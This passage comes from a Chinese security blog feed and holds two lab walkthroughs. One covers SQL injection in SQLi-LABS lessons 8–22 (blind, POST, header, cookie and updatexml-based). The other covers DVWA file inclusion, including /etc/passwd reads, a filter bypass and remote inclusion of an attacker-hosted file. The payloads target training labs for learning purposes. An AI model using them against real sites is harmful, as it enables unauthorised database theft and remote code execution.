database()),1,1))：返回数据库名称的第一个字母,转化为ascii码</span><br><span class="line">if(ascii(substr((select database()),1,1))&gt;64, 1, 0)：ascii大于64就返回true，if就返回1，否则返回0</span><br></pre></td></tr></table></figure><p>二分法猜数据库名字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1)&gt;64 %23   返回正确，大于64  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;96 %23  返回正确，大于96  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&lt;123 %23 返回正确，小于123 ，区间在97-122  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;109 %23 返回正确，大于109，区间在110-122  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;116 %23 返回错误，所以在110-116之间  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;112 %23 返回正确，大于112，区间在113-116之间  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;114 %23 返回正确，大于114，间在115-116之间  </span><br><span class="line">http://localhost/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1))&gt;115 %23 返回错误，不大于115，即第一个字母的ascii为115，即字母s</span><br></pre></td></tr></table></figure></p><p>盲注一般是写脚本或者使用工具辅助，否则手动盲注需要大量时间</p><h2 id="less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="less 9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)"></a>less 9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</h2><p>无论正确还是错误他都只会显示<code>you are in......</code>所以只能用基于时间的盲注</p><p>只有单引号闭合的时候，他才会延迟5秒。所以可以判断出来这里是单引号闭合。</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011135003.png" alt></p><p>然后同less 8的盲注，</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011147798.png" alt></p><p>当database()第一个字母的ascii大于115的时候会延迟5秒，当大于114的时候没有延迟，所以可以判断第一个字母的ascii直是115。其他数据查询方式同理</p><h2 id="less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="less 10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a>less 10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h2><p>这道题跟less 9一摸一样，只不过是单引号闭合变为双引号闭合</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011209337.png" alt></p><p>因为双引号闭合的时候，延迟了5秒。</p><h2 id="less11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#less11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a>less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h2><p>查看元素可以知道两个POST分别是uname和passwd。</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011238124.png" alt></p><p>首先uname=1’&amp;passwd=2,报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;2&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>发现1没有报错，2为什么两边只有一个单引号，看源码</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011406347.png" alt></p><p>应该是加进去的单引号跟前面的单引号闭合，剩余的单引号与password前面的单引号闭合，最后剩余了password后面的单引号。</p><p>加个or 1=1 – k发现登陆成功</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011417120.png" alt></p><p>或者在passwd后面加单引号报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;2&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>可以发现是单引号闭合，然后直接or 1=1 – k发现登陆成功</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011446658.png" alt></p><p>如果是<code>uname=1&#39; or &#39;1&#39;=&#39;1&amp;passwd=2</code>，在源代码中显示正常</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011501411.png" alt></p><p>可是却登陆失败。</p><p>因为and的优先级高于or 【就是and先运算】， <code>&#39;1&#39;=&#39;1&#39; and password=&#39;2&#39;</code>先运算右边的<code>password=&#39;2&#39;</code>在数据表中不存在，所以右边是false，那么整个and就是false。然后计算<code>uname=&#39;1&#39; or false</code> ，而两边都是false所以最后的结果就是false。</p><p>那么就<code>uname=1&amp;passwd=2&#39; or &#39;1&#39;=&#39;1</code>在源码中</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011536263.png" alt></p><p>先计算<code>uname=&#39;1&#39; and password=&#39;2&#39;</code>结果是false，然后计算<code>false or 1=1</code>，右边是true，那么整个or就是true。</p><p>这里也可以通过盲注获取信息</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011557607.png" alt></p><h2 id="less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><a href="#less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="less 12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)"></a>less 12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</h2><p>双引号报错</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011612178.png" alt></p><p>可以知道是(“变量”)闭合，直接绕过</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011623357.png" alt></p><h2 id="less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="less 13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>less 13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h2><p>单引号报错</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011635743.png" alt></p><p>知道是(‘变量’)闭合，可是却没有显示信息</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011646781.png" alt></p><p>那么就用双注入查库</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011657366.png" alt></p><p>查表</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011712048.png" alt></p><p>其余操作前面有不再细说。</p><h2 id="less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="less 14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>less 14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h2><p>变为双引号闭合，操作同less 13</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011732912.png" alt></p><h2 id="less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注"><a href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes-基于bool型-时间延迟单引号POST型盲注" class="headerlink" title="less 15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)"></a>less 15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</h2><p>错误信息被隐藏了，所以只能用盲注。</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011748231.png" alt></p><p>说明是单引号闭合<br>数据库名长度为8</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011759626.png" alt></p><p>数据库名第一个字母ASCII为115</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011811388.png" alt></p><p>二分法加limit得到所有数据表名字</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011822831.png" alt></p><p>同理可得到字段名，以及数据。</p><p>如果我插入<code>uname=1&amp;passwd=2&#39; or sleep(5) -- k</code>会延迟1分多最后什么也没有显示。在cmd中返回为空</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011835149.png" alt></p><p>原来是<code>false or sleep(5)</code>最后返回为0,最后就什么也查不到。</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011858091.png" alt></p><p><strong>and与or的截断性</strong></p><p>在SQL语句中如果and前面为false那么后面的语句就不会执行。<br>如果or前面为true那么后面的语句就不会执行。</p><h2 id="less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注"><a href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes-基于bool型-时间延迟的双引号POST型盲注" class="headerlink" title="less 16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)"></a>less 16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)</h2><p>同15，这里用时间延迟盲注</p><p>说明是(“闭合”)</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327011959345.png" alt></p><p>lenth=8时不会延迟，说明数据库名字长度为8</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012007235.png" alt></p><p>其他把length函数换成select的操作同less 7</p><h2 id="less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="less 17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>less 17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h2><p>注意：下面的注入，一不小心可能把数据库的user表的密码表给清空了</p><p><a href="http://www.w3school.com.cn/xpath/" target="_blank" rel="noopener">xpath教程</a><br><a href="http://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="noopener">UpdateXml() MYSQL显错注入</a></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012200415.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个参数是 目标xml</span><br><span class="line">第二个参数是 xpath的表达式，这个看w3c那个xpath教程</span><br><span class="line">第三个参数是 要将xpath的表达式的东西将目标xml替换成什么</span><br></pre></td></tr></table></figure><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012230713.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">    &#123;</span><br><span class="line">    if(!empty($value))</span><br><span class="line">        &#123;</span><br><span class="line">        $value = substr($value,0,15);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // // 去除斜杠</span><br><span class="line">        if (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        // 如果不是数字则加引号并转义</span><br><span class="line">        if (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">//是数字也要用intval转化成int，因为传过来的是字符型数字              </span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    return $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">check_input函数首先判断如果不为空，就截取前15个字符。</span><br><span class="line">当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1</span><br><span class="line">当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/senlin1202/article/details/50799967" target="_blank" rel="noopener">magic_quotes_gpc函数</a><br><a href="http://www.w3school.com.cn/php/func_string_addslashes.asp" target="_blank" rel="noopener">addslashes函数</a><br><a href="http://www.w3school.com.cn/php/func_string_stripslashes.asp" target="_blank" rel="noopener">stripslashes函数</a><br><a href="http://php.net/manual/zh/function.ctype-digit.php" target="_blank" rel="noopener">ctype_digit函数</a><br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string函数</a></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012512983.png" alt></p><p>首先通过用户名找到用户名和密码，接着更新那个用户名的密码为新输入的密码。</p><p>首先要绕过通过用户名查询出用户名和密码，这个我们只能猜吧，比如admin，root，test什么的，这个可以用字典在这里我们就当知道是admin了，直接用admin就考虑下一步</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012525134.png" alt></p><p>这里是单引号闭合，直接用updatexml显错注入。</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012534475.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012543876.png" alt></p><p>查表</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012558948.png" alt></p><p>查列</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012613692.png" alt></p><p>查数据</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012620995.png" alt></p><h2 id="less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="less 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>less 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h2><p>这里对用户名和密码都加了过滤</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012633827.png" alt></p><p>正常登陆后显示User Agent<br>用burp抓包改包，先在后面加单引号出现报错信息</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012643631.png" alt></p><p>可以知道闭合方式为(‘变量’,’变量’,’变量’)，继续用updatexml显错注入</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012653168.png" alt></p><h2 id="less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="less 19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>less 19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h2><p>正常登陆后显示的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your IP ADDRESS is: 127.0.0.1</span><br><span class="line">Your Referer is: http://127.0.0.1/sqli-labs-master/Less-18/</span><br></pre></td></tr></table></figure></p><p>抓包改包，referer后加个单引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;127.0.0.1&apos;)&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>可以猜测闭合方式为(‘变量’,’变量’)也可以用updatexml</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012721416.png" alt></p><p>还有另一个报错函数extractvalue<br>第一个参数也是个xml，第二个参数就是xpath的表达式，这个函数是获取xml中某个节点的值</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012730874.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012740002.png" alt></p><h2 id="less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="less 20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)"></a>less 20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</h2><p>两种方式</p><p>1 登陆的时候抓包在cookie后面加单引号</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012752819.png" alt></p><p>可以知道是单引号闭合，然后通过联合查询知道有3列</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012759666.png" alt></p><p>然后就可以用concat函数获得数据。</p><p>2.已经登陆并且有了cookie</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012811914.png" alt></p><h2 id="less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入"><a href="#less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入" class="headerlink" title="less 21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)"></a>less 21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)</h2><p>抓包发现cookie经过了base64编码</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012823454.png" alt></p><p>对admin’进行base64编码并发送过去发现报错信息</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012954436.png" alt></p><p>可以知道是(‘变量’)闭合方式<br>对SQL语句进行BASE64编码并发送</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327012833476.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327013018759.png" alt></p><p>其余同之前的操作</p><h2 id="less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="less 22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a>less 22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</h2><p>这个跟less 21一样只不过闭合方式变成了(“变量”)</p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327013032104.png" alt></p><p><img src="/SQLi-LABS-学习SQL注入_1/20190327013041026.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习（八）文件包含漏洞</title>
      <link href="/2018/05/30/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AB%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/05/30/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AB%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（八）文件包含漏洞<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函<code>include()，require()和include_once()，require_once()</code>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p><p>文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p><p><strong>本地文件包含(Loacl File Inclusion,LFI)</strong><br>通过浏览器引进(包含)web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格 的过滤允许遍历目录的字符注入浏览器并执行。</p><p><strong>远程文件包含(Remote File Inclusion,RFI)</strong><br>该漏洞允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码</p><p>系统中常见的敏感信息路径如下：<br><strong>（1）Windows系统</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110437127.png" alt></p><p><strong>（2）Linux系统</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110513075.png" alt></p><h2 id="LOW难度"><a href="#LOW难度" class="headerlink" title="LOW难度"></a>LOW难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>page参数没有任何过滤。点击三个文件名，服务器会包含相应的文件,page参数是不可控的。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110534603.png" alt></p><p>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>绝对路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=/etc/passwd</span><br></pre></td></tr></table></figure></p><p>../返回上级目录，可以用多次先返回到根目录然后再进入目标目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110614541.png" alt></p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在主机服务器创建test.txt文件</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110659419.png" alt></p><p>构造url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/page=http://192.168.86.1/test.txt</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326110957543.png" alt></p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line">// Input validation</span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>使用str_replace函数过滤了<code>http://</code>和<code>https://</code>，以及<code>../</code>和<code>..</code>。</p><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。<br>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p><p>远程文件包含：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=htthttp://p://192.168.86.1/test.txt</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111118415.png" alt></p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line">// Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">// This isn&apos;t the page we want!</span><br><span class="line">echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>fnmatch() 函数根据指定的模式来匹配文件名或字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">// This isn&apos;t the page we want!</span><br><span class="line">echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个if语句的意思是如果page中不含有file并且page不等于include.php服务器才不回去包含相应的文件。两个条件只要不满足其中之一就可以，要么page等于include.php,要么page含有file。用<code>file://</code>流访问本地文件系统。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/fi/?page=file:///etc/passwd</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111311487.png" alt></p><p>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;</span><br><span class="line">// This isn&apos;t the page we want!</span><br><span class="line">echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>采用白名单机制进行防护，，page参数必须为<code>include.php、file1.php、file2.php、file3.php</code>之一，彻底杜绝了文件包含漏洞。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>1.包含Apache日志文件：</strong></p><p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志),和error.log(错误日志),Apache的访问日志文件记录了客户端的每次请求以及服务器响应的相关信息。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111439128.png" alt></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111448122.png" alt></p><p>当访问一个不存在的资源的时候，Apache日志文件同样会记录，这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时，就可以去访问URL：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ww.XXX.com/&lt;?php 